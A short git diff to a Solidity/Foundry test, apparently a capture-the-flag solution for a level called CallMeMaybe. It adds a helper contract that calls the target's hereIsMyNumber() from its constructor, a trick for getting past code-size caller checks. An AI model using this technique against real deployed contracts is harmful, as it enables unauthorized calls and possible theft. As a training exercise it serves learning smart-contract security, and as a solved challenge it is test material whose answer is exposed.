@@ -5,6 +5,12 @@ import "./BaseTest.t.sol";
 import "src/05_CallMeMaybe/CallMeMaybe.sol";
 
 // forge test --match-contract CallMeMaybeTest -vvvv
+contract FuncCaller {
+    constructor(CallMeMaybe obj) {
+        obj.hereIsMyNumber();
+    }
+}
+
 contract CallMeMaybeTest is BaseTest {
     CallMeMaybe instance;
 
@@ -15,7 +21,7 @@ contract CallMeMaybeTest is BaseTest {
     }
 
     function testExploitLevel() public {
-        /* YOUR EXPLOIT GOES HERE */
+        new FuncCaller(instance);
 
         checkSuccess();
     }
